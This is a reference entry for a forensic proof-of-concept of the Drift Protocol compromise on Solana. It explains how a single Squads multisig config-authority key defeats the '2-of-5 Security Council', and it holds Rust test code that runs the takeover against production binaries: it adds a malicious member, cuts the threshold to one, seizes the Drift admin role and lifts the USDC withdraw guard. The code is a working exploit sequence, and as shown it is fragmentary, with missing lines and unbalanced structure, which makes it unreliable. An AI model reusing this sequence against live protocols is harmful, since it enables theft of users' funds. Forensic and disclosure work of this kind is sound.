# Reference #201

## Subject

Drift Protocol Single Point of Failure Proof-of-Concept (Config Authority Compromise)

## Source URL

[https://github.com/DriftVictimsCommittee/drift-forensics/tree/main/exploit_test](https://github.com/DriftVictimsCommittee/drift-forensics/tree/main/exploit_test)


## Technical Implementation Details

This Proof-of-Concept (PoC) replicates the exact architectural vulnerability that allowed the total compromise of the Drift Protocol.

It demonstrates that the "2-of-5 Security Council" was merely a facade, as the underlying Squads Multisig was configured with a **Controlled** setup, featuring a single-signature `Config Authority`.

### Environment Integrity

Unlike simulated mocks, this environment uses:
1.  **Production Binaries**: Exact `.so` files for Drift V2 (`dRiftyHA39MWEi3m9aunc5MzRF1JYuBsbn6VPcn33UH`) and Squads V4 (`SQDS4ep65T869zMMBKyuUq6aD6EgTu8psMjkvj52pCf`) dumped from Solana blockchain.
2.  **Pre-Incident State**: Account data snapshots taken prior to the exploit, ensuring the logic reflects the actual vulnerability window.
3.  **Binary Injection**: The `setup.sh` script performs a byte-level patch of the Multisig account JSON, replacing the original `Config Authority` public key (offset `40..72`) with a test keypair public key. This proves that possession of this single key is sufficient to bypass all consensus mechanisms.

### The Attack Vector

The test `config_auth_compromise` executes the following sequence in under 5 seconds:

1.  **Neutralize Consensus**: Uses the `Config Authority` to add a malicious member and lower the voting threshold to `1/5`.
2.  **Seize Administration**: Executes a batched transaction to Create, Approve, and Execute a proposal changing the Drift Program Admin to the attacker’s address.
3.  **Disable Safeguards**: As the new Admin, updates the `withdraw_guard_threshold` on the USDC Spot Market to `500,000,000,000,001`, effectively removing the circuit breaker and enabling unlimited drainage.

            data: vec![],

        "./deps/accounts/2LW6PSEjp81xSEttWwXDB6Etb1eKdhYPbFEojYbyhx88.json",

    store.store_account(multisig_id, multisig_account);

    // Drift former admin (multisig vault PDA)

    let (multisig_vault, multisig_vault_account) = keyed_account_from_json_file(
        "./deps/accounts/AiLGdNitMjv8n5HMS7HAdV2kaeJZZFd4jdfn5xp1PKrW.json",

        "./deps/accounts/AzxZ3jRuhftxbYbKuJKeBjJ37Nsmkb538KmURsuaRBVB.json",

    store.store_account(usdc_spot_market_id, usdc_spot_market_account);

    let new_member_pubkey = multisig_malicious_member.pubkey();

    let mut add_member_ix_data = vec![0u8; 8 + 32 + 2 + 1]; // discriminator + pubkey + u16 + Option
    add_member_ix_data[0..8].copy_from_slice(&[1, 219, 215, 108, 184, 229, 214, 8]); // ix discriminator
    add_member_ix_data[8..40].copy_from_slice(new_member_pubkey.as_ref()); // malicious actor pubkey
    add_member_ix_data[40..42].copy_from_slice(&7u16.to_le_bytes()); // max permission (7)
    add_member_ix_data[42] = 0; // memo: None

    let add_member_instruction = Instruction {
        program_id: SQUADS_PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(multisig_id, false),
            AccountMeta::new_readonly(multisig_config_authority_compromised.pubkey(), true),
            AccountMeta::new(multisig_config_authority_compromised.pubkey(), true),
            AccountMeta::new_readonly(SYSTEM_PROGRAM_ID, false),

        data: add_member_ix_data,

        accounts: vec![
            AccountMeta::new(multisig_id, false),
            AccountMeta::new_readonly(multisig_config_authority_compromised.pubkey(), true),
            AccountMeta::new(SQUADS_PROGRAM_ID, false),
            AccountMeta::new_readonly(SQUADS_PROGRAM_ID, false),

    // 2. Set threshold to 1
    let _tx_1_result = context.process_and_validate_instruction_chain(&[
        (&add_member_instruction, &[Check::success()]),
        (&set_threshold_instrucion, &[Check::success()]),

    // Squads Multisig Layout:
    // 0..8: Discriminator
    // 8..40: create_key

    // 72..74: threshold (u16)
    let multisig_account = context
        .account_store
        .borrow()
        .get_account(&multisig_id)
        .expect("Multisig account not found");

        multisig_account.data[72..74]

    // Prepare UpdateAdmin instruction message

    let new_admin: Pubkey = multisig_malicious_member.pubkey();

    update_admin_ix_data[0..8].copy_from_slice(&[161, 176, 40, 213, 60, 184, 179, 228]); // update_admin ix discriminator

    let mut message_bytes: Vec<u8> = Vec::new();

    // Header
    message_bytes.push(1); // num_signers
    message_bytes.push(0); // num_writable_signers
    message_bytes.push(2); // num_writable_non_signers

    // Account Keys
    message_bytes.push(3u8); // SmallVec len (3)
    message_bytes.extend_from_slice(&multisig_vault.to_bytes()); // Writable Signer
    message_bytes.extend_from_slice(&drift_state_id.to_bytes()); // Writable Non-Signer
    message_bytes.extend_from_slice(&DRIFT_PROGRAM_ID.to_bytes()); // Readonly Non-Signer

    // Instructions
    message_bytes.push(1u8); // SmallVec len

    message_bytes.push(2); // Program index

    // Account indexes
    message_bytes.push(2u8);
    message_bytes.extend_from_slice(&[0, 1]);

    // Instruction data
    message_bytes.extend_from_slice(&(update_admin_ix_data.len() as u16).to_le_bytes()); // SmallVec<u16, u8> -> 2 bytes len (LE)
    message_bytes.extend_from_slice(&update_admin_ix_data);

    // ALTs
    message_bytes.push(0);

    // ------------

    // Create & Approve & Execute Proposal solely (without a quorum)

    // Vault tx create

    // Fetch the current tx_index from multisig and ++
    let tx_index = u64::from_le_bytes(
        context
            .account_store
            .borrow()
            .get_account(&multisig_id)
            .unwrap()
            .data[78..86]
            .try_into()
            .unwrap(),
    ) + 1;

    // Derrive tx PDA
    let (transaction_pda, _) = Pubkey::find_program_address(
        &[
            b"multisig",
            multisig_id.to_bytes().as_ref(),
            b"transaction",
            tx_index.to_le_bytes().as_ref(),
        ],
        &Pubkey::from_str_const("SQDS4ep65T869zMMBKyuUq6aD6EgTu8psMjkvj52pCf"),
    );

    let mut vault_tx_create_data: Vec<u8> = Vec::new();
    vault_tx_create_data.extend_from_slice(&[48, 250, 78, 168, 208, 226, 218, 211]);
    vault_tx_create_data.push(0); // vault index
    vault_tx_create_data.push(0); // ephemeral
    vault_tx_create_data.extend_from_slice(&(message_bytes.len() as u32).to_le_bytes()); // message lengh

    vault_tx_create_data.push(0); // memo

    let vault_tx_create_instruction = Instruction {
        program_id: SQUADS_PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(multisig_id, false),
            AccountMeta::new(transaction_pda, false),
            AccountMeta::new(multisig_malicious_member.pubkey(), true),
            AccountMeta::new(multisig_malicious_member.pubkey(), true),
            AccountMeta::new_readonly(SYSTEM_PROGRAM_ID, false),
        ],
        data: vault_tx_create_data,
    };

    // ------------

    // Proposal create

    let (proposal_pda, _) = Pubkey::find_program_address(
        &[
            b"multisig",
            multisig_id.to_bytes().as_ref(),
            b"transaction",
            tx_index.to_le_bytes().as_ref(),
            b"proposal",
        ],
        &SQUADS_PROGRAM_ID,
    );

    let mut proposal_create_ix_data = vec![0u8; 8 + 8 + 1]; // anchor discriminator + u64 + bool
    proposal_create_ix_data[0..8].copy_from_slice(&[220, 60, 73, 224, 30, 108, 79, 159]); // ix discriminator
    proposal_create_ix_data[8..16].copy_from_slice(&tx_index.to_le_bytes()); // tx_index (u64, little-endian)
    proposal_create_ix_data[16] = 0; // false

    let proposal_create_instruction = Instruction {
        program_id: SQUADS_PROGRAM_ID,
        accounts: vec![
            AccountMeta::new_readonly(multisig_id, false),
            AccountMeta::new(proposal_pda, false),
            AccountMeta::new(multisig_malicious_member.pubkey(), false),
            AccountMeta::new(multisig_malicious_member.pubkey(), true),
            AccountMeta::new_readonly(SYSTEM_PROGRAM_ID, false),
        ],
        data: proposal_create_ix_data,
    };

    // ------------

    // Proposal approve

    let mut proposal_approve_ix_data = vec![0u8; 8 + 1]; // anchor discriminator + Option

    proposal_approve_ix_data[8] = 0; // None

    let proposal_approve_instruction = Instruction {
        program_id: SQUADS_PROGRAM_ID,
        accounts: vec![
            AccountMeta::new_readonly(multisig_id, false),
            AccountMeta::new(multisig_malicious_member.pubkey(), true),
            AccountMeta::new(proposal_pda, false),
        ],
        data: proposal_approve_ix_data,
    };

    // ------------

    // Vault tx execute

    let vault_tx_execute_instruction = Instruction {
        program_id: SQUADS_PROGRAM_ID,
        accounts: vec![
            AccountMeta::new_readonly(multisig_id, false),
            AccountMeta::new(proposal_pda, false),
            AccountMeta::new_readonly(transaction_pda, false),
            AccountMeta::new(multisig_malicious_member.pubkey(), true),
            //
            AccountMeta::new_readonly(multisig_vault, false),
            AccountMeta::new(drift_state_id, false),
            AccountMeta::new(DRIFT_PROGRAM_ID, false),
        ],
        data: vec![194, 8, 161, 87, 153, 164, 25, 171],
    };

    // Process instructions:
    // 1. Vault transaction Create
    // 2. Create Proposal
    // 3. Approve Proposal
    // 4. Vault Transaction Execute
    let _result = context.process_and_validate_instruction_chain(&[
        (&vault_tx_create_instruction, &[Check::success()]),
        (&proposal_create_instruction, &[Check::success()]),
        (&proposal_approve_instruction, &[Check::success()]),
        (&vault_tx_execute_instruction, &[Check::success()]),
    ]);

    // ---------

    // ASSERTION 2: Verify Admin Change
    // Drift State Layout:
    // 0..8: Discriminator
    // 8..40: admin (Pubkey)
    let drift_state_account = context
        .account_store
        .borrow()
        .get_account(&drift_state_id)
        .expect("Drift state account not found");

    let current_admin = Pubkey::new_from_array(
        drift_state_account.data[8..40]
            .try_into()
            .expect("Failed to parse admin pubkey"),
    );

    assert_eq!(current_admin, new_admin, "Drift Admin was not updated to malicious member");
    println!("✅ Assertion Passed: Drift Admin is now {}", new_admin);

    // ------------

    // Admin access is compromised now
    // so final step - Update Withdraw Guard Threshold on Drift V2 Program

    let new_withdraw_guard_threshold: u64 = 500_000_000_000_001;

    let mut update_withdraw_guard_threshold_ix_data = vec![0u8; 8 + 8]; // anchor discriminator + u64
    update_withdraw_guard_threshold_ix_data[0..8]
        .copy_from_slice(&[56, 18, 39, 61, 155, 211, 44, 133]); // ix discriminator
    update_withdraw_guard_threshold_ix_data[8..16]
        .copy_from_slice(&new_withdraw_guard_threshold.to_le_bytes()); // threshold

    let update_withdraw_guard_threshold_instrucion = Instruction {
        program_id: DRIFT_PROGRAM_ID,
        accounts: vec![
            AccountMeta::new(multisig_malicious_member.pubkey(), true),
            AccountMeta::new_readonly(drift_state_id, false),
            AccountMeta::new(usdc_spot_market_id, false),
        ],
        data: update_withdraw_guard_threshold_ix_data,
    };

    // Process the update_withdra_guard_threshold instruction
    let _update_withdrawal_guard_threshold_result = context.process_and_validate_instruction(
        &update_withdraw_guard_threshold_instrucion,
        &[Check::success()],
    );

    // ---------

    // ASSERTION 3: Verify Withdraw Guard Threshold Change
    let spot_market_account = context
        .account_store
        .borrow()
        .get_account(&usdc_spot_market_id)
        .expect("Spot market account not found");

    // SpotMarket Layout: withdraw_guard_threshold is located at [528..536]
    let current_threshold = u64::from_le_bytes(
        spot_market_account.data[528..536]
            .try_into()
            .expect("Failed to parse withdraw guard threshold"),
    );

    assert_eq!(
        current_threshold, new_withdraw_guard_threshold,
        "Withdraw guard threshold was not updated"
    );
    println!("✅ Assertion Passed: Withdraw guard threshold is now {}", current_threshold);

    // ---------
}
